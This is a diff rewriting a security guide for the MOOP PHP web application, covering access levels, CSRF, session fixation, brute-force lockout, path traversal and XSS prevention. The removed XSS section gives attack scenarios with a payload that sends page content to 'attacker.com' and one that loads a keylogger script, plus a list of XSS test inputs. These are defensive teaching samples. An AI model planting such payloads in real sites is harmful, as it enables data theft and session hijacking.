@@ -1,700 +1,300 @@
-# Access Control Security Implementation
+# MOOP Security Guide
 
-## Overview
-This document describes the secure access control system implemented to prevent unauthorized access escalation.
+**Last Updated:** March 2026
 
-## Security Vulnerability Fixed
+This document covers the security architecture implemented in MOOP, including
+access control, CSRF protection, session security, brute-force prevention,
+input validation, and XSS prevention.
 
-### Previous Issue
-- `access_group` was only a display variable, not validated on protected pages
-- Users could potentially manipulate URL parameters or session data to gain unauthorized access
-- No centralized access control logic
+---
 
-### Solution Implemented
-- Centralized access control in `access_control.php`
-- Session-based authentication with `access_level` stored securely in session
-- Automatic login for IP-based users with proper session management
-- Access validation on all protected pages
+## Access Control
 
-## Access Levels
+### Access Levels
 
-1. **Public** - Default access, no authentication required
-2. **Collaborator** - Logged-in users with specific organism access
-3. **Admin** - Logged-in users with admin role
-4. **ALL** - IP-based users from authorized IP range (127.0.0.11)
+MOOP uses four access levels (in order of privilege):
 
-## How It Works
+| Level | How Assigned | What They Can See |
+|-------|-------------|-------------------|
+| `PUBLIC` | Default — no login | Only assemblies in the "PUBLIC" group |
+| `IP_IN_RANGE` | Auto-login from configured IP ranges | All organisms and assemblies (no admin panel) |
+| `COLLABORATOR` | Logged in with credentials | Specific organisms/assemblies assigned in users.json |
+| `ADMIN` | Logged in with admin role | Everything + admin panel |
 
-### 1. Centralized Access Control (`access_control.php`)
-All pages now include this file which:
-- Checks visitor IP and auto-logs in authorized IP users
-- Provides helper functions to read access data from `$_SESSION` (single source of truth)
-- Provides `has_access()` and `require_access()` functions for access validation
-
-### 2. IP-Based Auto-Login
-Users from IP range 127.0.0.11 are automatically:
-- Logged in with username "IP_USER_{ip}"
-- Assigned `access_level` = 'ALL'
-- Given access to all pages and data
-- Protected from URL parameter manipulation
-
-### 3. Regular User Login
-Through `login.php`:
-- Validates username/password
-- Sets `access_level` = 'Admin' or 'Collaborator' based on role
-- Stores user-specific access permissions in session
-
-### 4. Page Protection
-Each protected page:
-- Includes `access_control.php` at the top
-- Calls `has_access()` or `require_access()` to validate access
-- Redirects unauthorized users to access_denied.php
-
-## Access Helper Functions
-
-The `access_control.php` file provides the following helper functions to securely access session data:
+### Key Functions (`includes/access_control.php`)
 
 ```php
-// Get current access level from session
-get_access_level()  // Returns: 'Public', 'Collaborator', 'Admin', or 'ALL'
-
-// Get current user's resource access list
-get_user_access()   // Returns: array of organisms/resources user can access
-
-// Check if user is logged in
-is_logged_in()      // Returns: true/false
-
-// Get currently logged-in username
-get_username()      // Returns: username string
+is_logged_in()                         // bool
+get_access_level()                     // 'PUBLIC' | 'IP_IN_RANGE' | 'COLLABORATOR' | 'ADMIN'
+has_access('COLLABORATOR')             // bool — checks level hierarchy
+has_assembly_access($organism, $asm)   // bool — checks groups + user access list
+require_access('COLLABORATOR')         // exits/redirects if not met
+is_public_assembly($organism, $asm)    // bool — checks organism_assembly_groups.json
 ```
 
-These functions always read from `$_SESSION` (the authoritative source) rather than relying on cached global variables, ensuring access checks are always based on current session state.
+### How Authentication Works
 
-## Session-Based Flow
+**IP-Based Auto-Login:**
+Users from configured IP ranges (set in Admin Dashboard → Site Configuration,
+stored in `config_editable.json` as `auto_login_ip_ranges`) are automatically:
+- Logged in with username `IP_USER_{ip}`
+- Assigned `access_level` = `'IP_IN_RANGE'`
+- Given access to all organisms and assemblies
+- Blocked from the admin panel (admin requires `'ADMIN'` level)
 
-### Complete Access Control Flow
+**Regular Login (`login.php`):**
+- Validates username/password against `users.json` (bcrypt hashed)
+- Regenerates session ID to prevent session fixation (`session_regenerate_id(true)`)
+- Sets `access_level` = `'ADMIN'` or `'COLLABORATOR'` based on role
+- Stores user-specific access permissions in session
+
+**Admin Page Protection (`admin/admin_init.php`):**
+- Verifies user is logged in with `'ADMIN'` access level
+- IP_IN_RANGE users are explicitly blocked (302 redirect to `access_denied.php`)
+- Automatically verifies CSRF token on all POST requests
+
+### Session Flow
 
 ```
 login.php
-  └─> Validates username/password
+  └─> Validates username/password (bcrypt)
+  └─> session_regenerate_id(true)  ← prevents session fixation
   └─> Sets $_SESSION["logged_in"] = true
   └─> Sets $_SESSION["username"] = username
   └─> Sets $_SESSION["access"] = user_access_array
   └─> Sets $_SESSION["role"] = 'admin' or null
-  └─> Sets $_SESSION["access_level"] = 'Admin' or 'Collaborator'
-  
-header.php
-  └─> Includes access_control.php
-      └─> Defines helper functions that read from $_SESSION:
-          ├─ is_logged_in()       → reads $_SESSION["logged_in"]
-          ├─ get_access_level()   → reads $_SESSION["access_level"]
-          ├─ get_user_access()    → reads $_SESSION["access"]
-          └─ get_username()       → reads $_SESSION["username"]
-      
-toolbar.php (included by header.php)
-  └─> Uses is_logged_in() helper
-  └─> Uses $_SESSION['role'] directly for admin check
-  └─> Displays Login/Logout buttons based on fresh session state
-  
-Protected pages (admin/*, tools/display/*, tools/extract/*)
-  └─> Include access_control.php
-  └─> Call has_access() function
-      └─> has_access() calls helpers for fresh reads:
-          ├─ get_access_level()
-          └─ get_user_access()
-  └─> Validate against protected resources
-  
-admin_access_check.php (called by all admin pages)
-  └─> Validates admin access:
-      ├─ is_logged_in() → check session exists
-      ├─ get_username() → get current user
-      ├─ Check user role in JSON file
-      └─ get_access_level() → validate is 'Admin' (not 'ALL')
-  └─> Blocks if any check fails (403 Forbidden)
+  └─> Sets $_SESSION["access_level"] = 'ADMIN' or 'COLLABORATOR'
+
+access_control.php (included by all pages)
+  └─> Checks IP range for auto-login
+  └─> Provides helper functions reading from $_SESSION
+  └─> Generates CSRF token
+
+admin_init.php (included by all admin pages)
+  └─> Validates ADMIN access level
+  └─> Verifies CSRF token on POST requests
+  └─> Blocks IP_IN_RANGE users
 
 logout.php
-  └─> Calls session_destroy()
-  └─> Clears all session data
+  └─> session_destroy()
   └─> Redirects to login
 ```
 
-### Key Security Properties
+### Assembly Visibility
 
-✅ **Single Source of Truth:** `$_SESSION` only
-- All access checks read from session
-- No cached global variables
-- No stale data possible
+Assembly visibility is controlled by `metadata/organism_assembly_groups.json`.
+The special group name `PUBLIC` makes an assembly visible to unauthenticated users.
+Logged-in users see assemblies assigned to them in `users.json` plus all PUBLIC assemblies.
 
-✅ **Fresh Reads on Every Check**
-- Helper functions call `$_SESSION` directly
-- No per-page initialization cache
-- Access changes take effect immediately
+---
 
-✅ **Defense in Depth**
-- login.php: Sets access level based on user role
-- admin_access_check.php: Re-validates against JSON + session
-- toolbar.php: Uses current session for UI
-- All layers independent and consistent
+## CSRF Protection
 
-✅ **No Parameter Injection**
-- Access level never read from GET/POST
-- Only from `$_SESSION` (server-side secure)
-- URL parameters have no effect
+CSRF (Cross-Site Request Forgery) protection prevents attackers from tricking
+authenticated users into submitting malicious requests.
 
-## Usage Examples
+### How It Works
 
-### Protect a Page
+CSRF protection is **centralized** — you don't need to write verification code:
+
+1. **Token generation:** `access_control.php` generates a token on every page load
+2. **HTML forms:** Add `<?= csrf_input_field() ?>` inside every `<form method="post">`
+3. **AJAX requests:** `js/modules/csrf.js` automatically attaches the token as
+   an `X-CSRF-Token` header to all jQuery AJAX calls and fetch requests
+4. **Verification:** `admin_init.php` calls `csrf_protect()` on every POST automatically
+
+### Files Involved
+
+| File | Role |
+|------|------|
+| `includes/access_control.php` | Generates token, provides `csrf_input_field()` and `csrf_protect()` |
+| `admin/admin_init.php` | Calls `csrf_protect()` on every POST |
+| `js/modules/csrf.js` | Auto-attaches token to jQuery AJAX and fetch requests |
+| `includes/head-resources.php` | Emits `<meta name="csrf-token">` tag |
+
+### Adding CSRF to New Code
+
+**New HTML form:**
 ```php
-<?php
-include_once __DIR__ . '/access_control.php';
+<form method="post" action="my_page.php">
+    <?= csrf_input_field() ?>
+    <!-- form fields -->
+    <button type="submit">Save</button>
+</form>
+```
 
-// Require collaborator access
-require_access('Collaborator');
+**New admin AJAX endpoint:** Just include `admin_init.php` — CSRF is verified automatically.
+jQuery will send the token as `X-CSRF-Token` header automatically via `csrf.js`.
 
-// Or check for specific organism access
-if (!has_access('Collaborator', $organism_name)) {
-    header("Location: /index.php");
+---
+
+## Session Security
+
+### Session Fixation Prevention
+`login.php` calls `session_regenerate_id(true)` immediately after successful
+authentication. This invalidates the old session ID, preventing an attacker
+from pre-setting a session ID and waiting for the user to authenticate with it.
+
+### Session Properties
+- Session data (`$_SESSION`) is the **single source of truth** for access control
+- Access level is never read from GET/POST parameters — only from session
+- Helper functions always read fresh from `$_SESSION` (no caching)
+
+---
+
+## Brute-Force Login Protection
+
+Implemented in `lib/functions_login_protection.php`, called from `login.php`.
+
+| Threshold | Action |
+|-----------|--------|
+| 5 failed attempts | 2-second delay before response |
+| 10 failed attempts | 15-minute account lockout |
+
+State is tracked in `logs/login_attempts.json` (per-username, with timestamps).
+Successful login resets the counter for that username.
+
+---
+
+## Path Traversal Prevention
+
+File download handlers (e.g., `lib/fasta_download_handler.php`) use `realpath()`
+to resolve the actual filesystem path, then verify it starts with the expected
+base directory:
+
+```php
+$real = realpath($requested_path);
+if ($real === false || strpos($real, $base_dir) !== 0) {
+    // Reject — path traversal attempt
+    http_response_code(403);
     exit;
 }
-?>
 ```
 
-### Check Access in Code
-```php
-if (has_access('ALL')) {
-    // Show all data
-} elseif (has_access('Admin')) {
-    // Show admin features
-} elseif (has_access('Collaborator', 'organism_name')) {
-    // Show specific organism data
-}
-```
-
-## Security Benefits
-
-1. **Session-Based Single Source of Truth** - All access checks read directly from `$_SESSION`, never from cached globals
-2. **No URL Parameter Manipulation** - Access level is stored in session, not in URLs
-3. **No Stale Cache Issues** - Helper functions always read fresh from `$_SESSION`
-4. **Consistent Validation** - All pages use the same access control logic
-5. **IP-Based Auto-Login** - Seamless access for authorized IP users without compromising security
-6. **Granular Control** - Each page can check for specific resource access
-7. **Admin Protection** - Admin panel validates both user role and access level, rejecting IP-based 'ALL' access
-
-## Configuration
-
-To modify the authorized IP range, edit `access_control.php`:
-
-```php
-$all_access_start_ip = ip2long("127.0.0.11");
-$all_access_end_ip   = ip2long("127.0.0.11");
-```
-
-For a range like 10.0.0.1 to 10.0.0.255:
-```php
-$all_access_start_ip = ip2long("10.0.0.1");
-$all_access_end_ip   = ip2long("10.0.0.255");
-```
-
-## Files Modified
-
-- `/moop/access_control.php` - NEW centralized access control
-- `/moop/index.php` - Uses access_control.php
-- `/moop/login.php` - Sets access_level in session
-- `/moop/tools/display/groups_display.php` - Protected with access validation
-- `/moop/tools/display/organism_display.php` - Protected with access validation
-- `/moop/admin/admin_header.php` - Enhanced admin protection
-
-## Testing
-
-1. **Test IP-based access**: Access from 127.0.0.11 should auto-login with ALL access
-2. **Test regular login**: Login with credentials should work normally
-3. **Test URL manipulation**: Adding `?access_group=ALL` should have no effect
-4. **Test protected pages**: Accessing organisms without permission should redirect
-5. **Test admin panel**: Only admin users should access admin pages (not IP-based ALL users)
-# MOOP Security: Input Validation & XSS Prevention
-
-**Last Updated:** January 25, 2026
+This prevents `../../etc/passwd` style attacks.
 
 ---
 
-## Overview
+## Shell Command Safety
 
-MOOP implements multiple layers of input validation and output escaping to prevent security vulnerabilities, particularly **Cross-Site Scripting (XSS)** attacks.
+All shell commands use `escapeshellarg()` on every user-supplied argument:
+
+```php
+$cmd = $blast_path . ' -db ' . escapeshellarg($db) . ' -evalue ' . escapeshellarg($evalue);
+exec($cmd, $output, $return_code);
+```
+
+Never interpolate user input directly into shell strings.
 
 ---
 
-## What is XSS (Cross-Site Scripting)?
+## SQL Injection Prevention
 
-### Definition
-XSS is a security vulnerability where an attacker injects malicious JavaScript code into a web page that gets executed in other users' browsers.
+All database queries use PDO prepared statements with parameterized values:
 
-### Real-World Example
-
-**Without XSS protection (VULNERABLE):**
 ```php
-// User enters: <script>alert('hacked')</script>
-echo "Welcome, " . $_GET['name'];
-// Output: Welcome, <script>alert('hacked')</script>
-// Result: Script RUNS in the browser ❌ DANGEROUS
+$stmt = $dbh->prepare('SELECT * FROM feature WHERE feature_id = ?');
+$stmt->execute([$feature_id]);
+$rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
 ```
 
-**With XSS protection (SAFE):**
-```php
-// Same malicious input: <script>alert('hacked')</script>
-echo "Welcome, " . htmlspecialchars($_GET['name']);
-// Output: Welcome, &lt;script&gt;alert('hacked')&lt;/script&gt;
-// Result: Displays as text, script doesn't run ✅ SAFE
-```
-
-### Attack Scenarios
-
-**Scenario 1: Session Hijacking**
-```
-Attacker posts: <script>fetch('/steal-session')</script>
-↓
-Other users visit the page
-↓
-Script runs in their browser
-↓
-Their session cookie is stolen
-↓
-Attacker can impersonate them
-```
-
-**Scenario 2: Data Exfiltration**
-```
-Attacker creates feature with name: <img src=x onerror="fetch('attacker.com?data='+document.body.innerText)">
-↓
-Admin views the feature
-↓
-Script runs and sends page content to attacker
-↓
-Sensitive data leaked
-```
-
-**Scenario 3: Malware Distribution**
-```
-Attacker posts: <script src="http://malware.com/keylogger.js"></script>
-↓
-Users visit page
-↓
-Keylogger installed in their browser
-↓
-Login credentials captured
-```
+Never use `$dbh->query()` with user-supplied values interpolated in.
 
 ---
 
-## How MOOP Prevents XSS
+## Proxy/IP Warning
 
-### 1. Output Escaping with htmlspecialchars()
+If IP-based auto-login is enabled and an `X-Forwarded-For` header is detected,
+`access_control.php` logs a warning. Behind a reverse proxy, `REMOTE_ADDR` is
+the proxy's IP (not the visitor's), which could grant unintended access.
 
-**The Core Defense:**
+---
+
+## JBrowse2 Track Authentication
+
+Track files in `data/tracks/` are protected by JWT (JSON Web Token) authentication:
+
+1. `.htaccess` in `data/tracks/` blocks all direct access (returns 403)
+2. Track requests go through `api/jbrowse2/tracks.php`
+3. `tracks.php` validates the JWT token before serving the file
+4. Tokens are signed with RSA keys in `certs/` (private key signs, public key verifies)
+5. Tokens expire after 1 hour
+
+---
+
+## XSS (Cross-Site Scripting) Prevention
+
+### Output Escaping
 
 All user-controlled data displayed in HTML is escaped using `htmlspecialchars()`:
 
 ```php
-// Convert dangerous characters:
-// < → &lt;
-// > → &gt;
-// & → &amp;
-// " → &quot;
-// ' → &#039;
+<?= htmlspecialchars($feature_name) ?>
 ```
 
-**Examples in MOOP codebase:**
+This converts dangerous characters (`<`, `>`, `&`, `"`, `'`) to HTML entities.
 
-**Feature Detail Page** (tools/pages/parent.php):
-```php
-// Line 221
-<?= htmlspecialchars($feature_uniquename) ?>
+### Encoding by Context
 
-// Line 282
-<em><?= htmlspecialchars($genus) ?> <?= htmlspecialchars($species) ?></em>
+| Context | Function |
+|---------|----------|
+| HTML text | `htmlspecialchars()` |
+| HTML attributes | `htmlspecialchars($val, ENT_QUOTES)` |
+| URLs | `urlencode()` or `rawurlencode()` |
+| JSON | `json_encode()` |
+| JavaScript data | `json_encode()` via inline_scripts |
 
-// Line 286
-<?= htmlspecialchars($common_name) ?>
-```
+### PHP to JavaScript Data Passing
 
-**Annotation Table** (lib/parent_functions.php):
-```php
-// Line 188
-$hit_id = htmlspecialchars($row['annotation_accession']);
-$hit_description = htmlspecialchars($row['annotation_description']);
-$annotation_source = htmlspecialchars($row['annotation_source_name']);
-
-// Line 201
-$html .= "<td><a href=\"" . htmlspecialchars($hit_id_link) . "\" target=\"_blank\">" . $hit_id . "</a></td>";
-```
-
-**Organism Display** (lib/display_functions.php):
-```php
-echo "<h2>" . htmlspecialchars($organism_name) . "</h2>";
-```
-
-### 2. Input Validation with Prepared Statements
-
-**For Database Queries:**
-
-All database access uses prepared statements to prevent SQL injection (which could be combined with XSS):
+Pass PHP values to JavaScript via the `inline_scripts` key in the `$data` array
+(never interpolate PHP variables directly into `<script>` tags):
 
 ```php
-// SAFE - uses parameterized query
-$stmt = $db->prepare("SELECT * FROM feature WHERE feature_uniquename = ?");
-$stmt->execute([$uniquename]);
-
-// DANGEROUS - never do this
-$query = "SELECT * FROM feature WHERE feature_uniquename = '" . $uniquename . "'";
-$db->query($query);  // ❌ SQL injection vulnerability
-```
-
-### 3. URL Parameter Escaping
-
-**For URLs in HTML attributes:**
-
-```php
-// SAFE - urlencode() prevents XSS in URL parameters
-<a href="/moop/tools/organism.php?organism=<?= urlencode($organism_name) ?>">
-
-// DANGEROUS - without urlencode
-<a href="/moop/tools/organism.php?organism=<?= $organism_name ?>">
-// If organism contains quotes/special chars, could break HTML
-```
-
-### 4. JSON Output Escaping
-
-**For JSON responses in AJAX:**
-
-```php
-// SAFE - json_encode() handles escaping
-header('Content-Type: application/json');
-echo json_encode(['message' => $user_input]);
-
-// DANGEROUS - raw string interpolation
-echo '{"message": "' . $user_input . '"}';  // ❌ Could break JSON structure
+'inline_scripts' => [
+    "const sitePath = " . json_encode($site_path) . ";",
+    "const organism = " . json_encode($organism_name) . ";",
+]
 ```
 
 ---
 
-## Where XSS Protection is Implemented
-
-### Display Locations (High Priority)
-
-| Location | Risk | Protection |
-|----------|------|-----------|
-| Feature names/descriptions | HIGH | `htmlspecialchars()` |
-| Annotation data | HIGH | `htmlspecialchars()` |
-| User input in forms | HIGH | `htmlspecialchars()` |
-| Search results | HIGH | `htmlspecialchars()` |
-| Error messages | HIGH | `htmlspecialchars()` |
-| URLs in links | MEDIUM | `urlencode()` or `htmlspecialchars()` |
-| Configuration values | MEDIUM | `htmlspecialchars()` |
-| Admin panel forms | HIGH | `htmlspecialchars()` |
-
-### Code Patterns
-
-**Pattern 1: Simple text display**
-```php
-// ✅ CORRECT
-<?= htmlspecialchars($data) ?>
-
-// ❌ WRONG
-<?= $data ?>
-```
-
-**Pattern 2: HTML attributes**
-```php
-// ✅ CORRECT
-<a href="<?= htmlspecialchars($url) ?>">Link</a>
-
-// ❌ WRONG
-<a href="<?= $url ?>">Link</a>
-```
-
-**Pattern 3: JavaScript data**
-```php
-// ✅ CORRECT (PHP-generated JS with data)
-<script>
-const userId = <?= json_encode($user_id) ?>;
-const userName = <?= json_encode($user_name) ?>;
-</script>
-
-// ❌ WRONG (direct interpolation)
-<script>
-const userName = "<?= $user_name ?>";  // Could break JS syntax
-</script>
-```
-
-**Pattern 4: Building HTML strings**
-```php
-// ✅ CORRECT
-$html .= "<td>" . htmlspecialchars($value) . "</td>";
-
-// ❌ WRONG
-$html .= "<td>" . $value . "</td>";
-```
-
----
-
-## Testing for XSS Vulnerabilities
-
-### Test Payloads
-
-Use these test inputs to verify XSS protection:
-
-```
-Basic script:
-<script>alert('XSS')</script>
-
-Event handler:
-<img src=x onerror="alert('XSS')">
-
-Encoded script:
-<img src=x onerror="alert('XSS')">
-
-Quote breaking:
-" onload="alert('XSS')
-
-Single quote:
-' onload='alert("XSS")
-
-Data URI:
-<img src="data:text/html,<script>alert('XSS')</script>">
-
-SVG vector:
-<svg onload="alert('XSS')">
-```
-
-### Manual Testing
-
-1. **Search feature by name:**
-   - Enter: `<script>alert('XSS')</script>`
-   - Expected: Script tag displays as text, no alert
-   - If alert appears: ❌ VULNERABILITY
-
-2. **Add annotation:**
-   - Enter description: `<img src=x onerror="alert('XSS')">`
-   - View feature page
-   - Expected: HTML displays as text
-   - If alert appears: ❌ VULNERABILITY
-
-3. **User login with special characters:**
-   - Username: `test" onload="alert('XSS')`
-   - Expected: Displayed safely in session/page
-   - If alert appears: ❌ VULNERABILITY
-
----
-
-## Defense-in-Depth Strategy
-
-MOOP uses **layered security** (defense-in-depth):
-
-```
-Layer 1: Input Validation
-         ↓ (check for dangerous patterns)
-Layer 2: Input Sanitization
-         ↓ (remove/encode dangerous chars)
-Layer 3: Output Escaping
-         ↓ (htmlspecialchars, json_encode)
-Layer 4: Content Security Policy (CSP)
-         ↓ (browser-level protection - if configured)
-Result: Multiple defenses against XSS
-```
-
----
-
-## Related Security Practices
-
-### 1. Prepared Statements (SQL Injection Prevention)
-Prevents attackers from modifying SQL queries by injecting code.
-
-```php
-// ✅ SAFE
-$stmt = $db->prepare("SELECT * FROM feature WHERE id = ?");
-$stmt->execute([$id]);
-
-// ❌ VULNERABLE
-$result = $db->query("SELECT * FROM feature WHERE id = " . $id);
-```
-
-### 2. Session Security
-- Secure session tokens (PHP native)
-- HttpOnly flag prevents JavaScript access to cookies
-- Secure flag (HTTPS only) if using SSL
-- SameSite attribute prevents CSRF attacks
-
-### 3. Password Security
-- Bcrypt hashing (not plaintext)
-- Password verification: `password_verify($input, $hash)`
-
-```php
-// ✅ SAFE
-if (password_verify($_POST['password'], $stored_hash)) {
-    // Login successful
-}
-
-// ❌ DANGEROUS
-if ($_POST['password'] === $plaintext_password) {
-    // Login successful
-}
-```
-
-### 4. Error Handling
-- Sensitive errors logged (not shown to users)
-- Generic errors displayed to prevent information leakage
-
-```php
-// ✅ SAFE
-try {
-    $db->query($query);
-} catch (Exception $e) {
-    error_log($e->getMessage());  // Log detailed error
-    echo "Database error occurred";  // Generic message to user
-}
-
-// ❌ DANGEROUS
-} catch (Exception $e) {
-    echo $e->getMessage();  // Leaks sensitive info
-}
-```
-
----
-
-## Best Practices for Developers
-
-### Rule 1: Always Escape Output
-```php
-// When displaying any user-controlled data:
-<?= htmlspecialchars($user_data) ?>
-```
-
-### Rule 2: Use Prepared Statements
-```php
-// For all database queries with variables:
-$stmt = $db->prepare("SELECT * FROM table WHERE col = ?");
-$stmt->execute([$variable]);
-```
-
-### Rule 3: Encode for Context
-- **HTML context:** `htmlspecialchars()`
-- **URL context:** `urlencode()` or `rawurlencode()`
-- **JSON context:** `json_encode()`
-- **CSS context:** Use CSS escaping or avoid user input
-- **JavaScript context:** Use `json_encode()` for data
-
-### Rule 4: Validate Input
-```php
-// Check input type/format before processing
-if (!is_numeric($id)) {
-    die("Invalid ID");
-}
-
-if (strlen($name) > 255) {
-    die("Name too long");
-}
-```
-
-### Rule 5: Use Security Headers (Optional but Recommended)
-```php
-// In head-resources.php or main entry point:
-header("X-Content-Type-Options: nosniff");  // Prevent MIME-type sniffing
-header("X-Frame-Options: SAMEORIGIN");      // Prevent clickjacking
-header("X-XSS-Protection: 1; mode=block");   // Browser XSS protection
-header("Referrer-Policy: strict-origin-when-cross-origin");
-```
-
----
-
-## Common Mistakes (What NOT to Do)
-
-### ❌ Mistake 1: Forgetting htmlspecialchars()
-```php
-// WRONG
-echo "<h1>" . $title . "</h1>";
-
-// RIGHT
-echo "<h1>" . htmlspecialchars($title) . "</h1>";
-```
-
-### ❌ Mistake 2: Using strip_tags() for Security
-```php
-// WRONG - strip_tags is for removing HTML, not for security
-$safe = strip_tags($user_input);
-
-// RIGHT
-$safe = htmlspecialchars($user_input);
-```
-
-### ❌ Mistake 3: Double Escaping
-```php
-// WRONG - escapes twice (data displays wrong)
-echo htmlspecialchars(htmlspecialchars($data));
-
-// RIGHT
-echo htmlspecialchars($data);
-```
-
-### ❌ Mistake 4: Using Addslashes Instead of Prepared Statements
-```php
-// WRONG - addslashes is not for SQL injection prevention
-$safe = addslashes($user_input);
-$db->query("SELECT * WHERE name = '$safe'");
-
-// RIGHT - use prepared statements
-$stmt = $db->prepare("SELECT * WHERE name = ?");
-$stmt->execute([$user_input]);
-```
-
-### ❌ Mistake 5: Trusting User-Supplied File Names
-```php
-// WRONG - file name could contain ../../../etc/passwd
-$file = $_FILES['upload']['name'];
-readfile("/uploads/" . $file);
-
-// RIGHT - generate safe file name or validate
-$file = uniqid() . '_' . basename($_FILES['upload']['name']);
-$file = preg_replace('/[^a-zA-Z0-9._-]/', '', $file);
-readfile("/uploads/" . $file);
-```
-
----
-
-## Checklist for Reviewing Code
-
-When reviewing MOOP code, check:
-
-- [ ] All `echo` statements with variables use `htmlspecialchars()`?
-- [ ] All database queries use prepared statements?
-- [ ] All URLs in href attributes are properly encoded?
-- [ ] All JSON responses use `json_encode()`?
+## Security Checklist for Code Review
+
+When reviewing or writing MOOP code:
+
+- [ ] All `echo`/`<?=` with variables use `htmlspecialchars()`?
+- [ ] All database queries use prepared statements with `?` placeholders?
+- [ ] All forms include `<?= csrf_input_field() ?>`?
+- [ ] All admin endpoints include `admin_init.php`?
+- [ ] All shell commands use `escapeshellarg()` on arguments?
+- [ ] All file path operations validate with `realpath()` + base-dir check?
+- [ ] URLs in href attributes are properly encoded?
+- [ ] JSON responses use `json_encode()`?
 - [ ] Error messages don't leak sensitive information?
-- [ ] File operations validate/sanitize file paths?
-- [ ] User input is validated for length/type before processing?
 - [ ] No hardcoded passwords or API keys in code?
-- [ ] Sessions use secure configuration?
+
+---
+
+## Files Reference
+
+| File | Security Role |
+|------|--------------|
+| `includes/access_control.php` | Auth functions, CSRF token generation, IP auto-login |
+| `admin/admin_init.php` | Admin auth + CSRF verification on POST |
+| `admin/admin_access_check.php` | Validates ADMIN role, blocks IP_IN_RANGE |
+| `js/modules/csrf.js` | Auto-attaches CSRF token to AJAX requests |
+| `includes/head-resources.php` | Emits CSRF meta tag |
+| `login.php` | Authentication, session fixation fix |
+| `lib/functions_login_protection.php` | Brute-force protection (delay + lockout) |
+| `lib/fasta_download_handler.php` | Path traversal prevention |
+| `api/jbrowse2/tracks.php` | JWT validation for track access |
+| `lib/jbrowse/track_token.php` | JWT token generation and verification |
 
 ---
 
 ## Resources
 
-- **OWASP XSS Prevention Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
-- **PHP htmlspecialchars():** https://www.php.net/manual/en/function.htmlspecialchars.php
-- **OWASP Top 10:** https://owasp.org/www-project-top-ten/
-- **PHP Prepared Statements:** https://www.php.net/manual/en/pdo.prepared-statements.php
-
----
-
-## Summary
-
-XSS is prevented in MOOP through:
-1. **Output escaping** with `htmlspecialchars()` on all displayed data
-2. **Prepared statements** for all database queries
-3. **Input validation** to reject invalid data early
-4. **Proper encoding** for context (HTML, URL, JSON)
-5. **Error handling** that doesn't leak sensitive information
-
-This multi-layered approach prevents attackers from injecting and executing malicious code in MOOP.
-
----
-
-**For security questions or concerns, contact:** [Admin contact information]
+- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
+- [PHP htmlspecialchars()](https://www.php.net/manual/en/function.htmlspecialchars.php)
+- [PHP Prepared Statements](https://www.php.net/manual/en/pdo.prepared-statements.php)
